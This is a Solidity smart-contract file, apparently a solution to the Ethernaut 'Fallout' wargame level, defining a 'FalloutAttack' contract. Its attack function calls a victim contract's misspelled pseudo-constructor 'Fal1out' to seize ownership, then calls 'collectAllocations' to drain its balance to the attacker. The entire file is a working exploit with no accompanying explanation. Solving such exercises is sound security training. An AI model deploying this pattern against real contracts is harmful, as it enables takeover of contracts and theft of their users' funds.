// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

interface FalloutInterface {
    function Fal1out() external payable;
    function collectAllocations() external;
}

contract FalloutAttack {
    address payable public attacker;

    constructor() {
        attacker = payable(msg.sender);
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "FalloutAttack: Only attacker can perform the action.");
        _;
    }

    function attack(address _victim) external payable onlyAttacker {
        FalloutInterface falloutInstance = FalloutInterface(_victim);
        falloutInstance.Fal1out();
        falloutInstance.collectAllocations();
    }

    receive() external payable {}
}
